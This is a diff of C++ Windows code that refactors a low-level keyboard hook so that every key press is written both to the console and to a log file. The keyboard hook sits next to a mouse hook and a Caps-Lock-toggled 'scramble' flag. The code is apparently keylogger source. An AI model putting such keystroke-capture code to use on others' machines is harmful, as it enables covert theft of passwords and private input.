@@ -13,6 +13,20 @@ BOOL scramble = FALSE;
 
 ofstream file;
 
+void output(const char* out)
+{
+	cout << out << endl;
+	file << out << endl;
+	return;
+}
+
+void output(char out)
+{
+	cout << out << endl;
+	file << out << endl;
+	return;
+}
+
 LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	PMOUSEHOOKSTRUCT p = (PMOUSEHOOKSTRUCT)lParam;
@@ -73,74 +87,74 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			switch (p->vkCode)
 			{
-			case 0x08: file << "BACKSPACE" << endl; break;
-			case 0x09: file << "TAB" << endl; break;
-			case 0x0D: file << "ENTER" << endl; break;
-			case 0x13: file << "PAUSE" << endl; break;
-			case 0x14: file << "CAPS LOCK" << endl; scramble ? scramble = FALSE : scramble = TRUE; break;
-			case 0x1B: file << "ESC" << endl; break;
-			case 0x20: file << "SPACEBAR" << endl; break;
-			case 0x21: file << "PAGE UP" << endl; break;
-			case 0x22: file << "PAGE DOWN" << endl; break;
-			case 0x23: file << "END" << endl; break;
-			case 0x24: file << "HOME" << endl; break;
-			case 0x25: file << "LEFT ARROW" << endl; break;
-			case 0x26: file << "UP ARROW" << endl; break;
-			case 0x27: file << "RIGHT ARROW" << endl; break;
-			case 0x28: file << "DOWN ARROW" << endl; break;
-			case 0x2C: file << "PRINT SCREEN" << endl; break;
-			case 0x2D: file << "INS" << endl; break;
-			case 0x2E: file << "DEL" << endl; break;
-			case 0x5B: file << "LWIN" << endl; break;
-			case 0x5C: file << "RWIN" << endl; break;
-			case 0x5D: file << "MENU" << endl; break;
-			case 0x60: file << "NUM_0" << endl; break;
-			case 0x61: file << "NUM_1" << endl; break;
-			case 0x62: file << "NUM_2" << endl; break;
-			case 0x63: file << "NUM_3" << endl; break;
-			case 0x64: file << "NUM_4" << endl; break;
-			case 0x65: file << "NUM_5" << endl; break;
-			case 0x66: file << "NUM_6" << endl; break;
-			case 0x67: file << "NUM_7" << endl; break;
-			case 0x68: file << "NUM_8" << endl; break;
-			case 0x69: file << "NUM_9" << endl; break;
-			case 0x6A: file << "NUM_MULTIPLY" << endl; break;
-			case 0x6B: file << "NUM_ADD" << endl; break;
-			case 0x6D: file << "NUM_SUBTRACT" << endl; break;
-			case 0x6E: file << "NUM_DECIMAL" << endl; break;
-			case 0x6F: file << "NUM_DIVIDE" << endl; break;
-			case 0x70: file << "F1" << endl; break;
-			case 0x71: file << "F2" << endl; break;
-			case 0x72: file << "F3" << endl; break;
-			case 0x73: file << "F4" << endl; break;
-			case 0x74: file << "F5" << endl; break;
-			case 0x75: file << "F6" << endl; break;
-			case 0x76: file << "F7" << endl; break;
-			case 0x77: file << "F8" << endl; break;
-			case 0x78: file << "F9" << endl; break;
-			case 0x79: file << "F10" << endl; break;
-			case 0x7A: file << "F11" << endl; break;
-			case 0x7B: file << "F12" << endl; break;
-			case 0x90: file << "NUM LOCK" << endl; break;
-			case 0x91: file << "SCROLL LOCK" << endl; break;
-			case 0xA0: file << "LSHIFT" << endl; break;
-			case 0xA1: file << "RSHIFT" << endl; break;
-			case 0xA2: file << "LCTRL" << endl; break;
-			case 0xA3: file << "RCTRL" << endl; break;
-			case 0xA4: file << "LALT" << endl; break;
-			case 0xA5: file << "RALT" << endl; break;
-			case 0xBA: file << ";" << endl; break;
-			case 0xBB: file << "+" << endl; break;
-			case 0xBC: file << "," << endl; break;
-			case 0xBD: file << "-" << endl; break;
-			case 0xBE: file << "." << endl; break;
-			case 0xBF: file << "/" << endl; break;
-			case 0xC0: file << "~" << endl; break;
-			case 0xDB: file << "[" << endl; break;
-			case 0xDC: file << "\\" << endl; break;
-			case 0xDD: file << "]" << endl; break;
-			case 0xDE: file << "'" << endl; break;
-			default: file << (char)p->vkCode << endl; break;
+			case 0x08: output("BACKSPACE"); break;
+			case 0x09: output("TAB"); break;
+			case 0x0D: output("ENTER"); break;
+			case 0x13: output("PAUSE"); break;
+			case 0x14: output("CAPS LOCK"); scramble ? scramble = FALSE : scramble = TRUE; break;
+			case 0x1B: output("ESC"); break;
+			case 0x20: output("SPACEBAR"); break;
+			case 0x21: output("PAGE UP"); break;
+			case 0x22: output("PAGE DOWN"); break;
+			case 0x23: output("END"); break;
+			case 0x24: output("HOME"); break;
+			case 0x25: output("LEFT ARROW"); break;
+			case 0x26: output("UP ARROW"); break;
+			case 0x27: output("RIGHT ARROW"); break;
+			case 0x28: output("DOWN ARROW"); break;
+			case 0x2C: output("PRINT SCREEN"); break;
+			case 0x2D: output("INS"); break;
+			case 0x2E: output("DEL"); break;
+			case 0x5B: output("LWIN"); break;
+			case 0x5C: output("RWIN"); break;
+			case 0x5D: output("MENU"); break;
+			case 0x60: output("NUM_0"); break;
+			case 0x61: output("NUM_1"); break;
+			case 0x62: output("NUM_2"); break;
+			case 0x63: output("NUM_3"); break;
+			case 0x64: output("NUM_4"); break;
+			case 0x65: output("NUM_5"); break;
+			case 0x66: output("NUM_6"); break;
+			case 0x67: output("NUM_7"); break;
+			case 0x68: output("NUM_8"); break;
+			case 0x69: output("NUM_9"); break;
+			case 0x6A: output("NUM_MULTIPLY"); break;
+			case 0x6B: output("NUM_ADD"); break;
+			case 0x6D: output("NUM_SUBTRACT"); break;
+			case 0x6E: output("NUM_DECIMAL"); break;
+			case 0x6F: output("NUM_DIVIDE"); break;
+			case 0x70: output("F1"); break;
+			case 0x71: output("F2"); break;
+			case 0x72: output("F3"); break;
+			case 0x73: output("F4"); break;
+			case 0x74: output("F5"); break;
+			case 0x75: output("F6"); break;
+			case 0x76: output("F7"); break;
+			case 0x77: output("F8"); break;
+			case 0x78: output("F9"); break;
+			case 0x79: output("F10"); break;
+			case 0x7A: output("F11"); break;
+			case 0x7B: output("F12"); break;
+			case 0x90: output("NUM LOCK"); break;
+			case 0x91: output("SCROLL LOCK"); break;
+			case 0xA0: output("LSHIFT"); break;
+			case 0xA1: output("RSHIFT"); break;
+			case 0xA2: output("LCTRL"); break;
+			case 0xA3: output("RCTRL"); break;
+			case 0xA4: output("LALT"); break;
+			case 0xA5: output("RALT"); break;
+			case 0xBA: output(";"); break;
+			case 0xBB: output("+"); break;
+			case 0xBC: output(","); break;
+			case 0xBD: output("-"); break;
+			case 0xBE: output("."); break;
+			case 0xBF: output("/"); break;
+			case 0xC0: output("~"); break;
+			case 0xDB: output("["); break;
+			case 0xDC: output("\\"); break;
+			case 0xDD: output("]"); break;
+			case 0xDE: output("'"); break;
+			default: output((char)p->vkCode); break;
 			}
 
 			if (scramble && p->vkCode != 0x14)
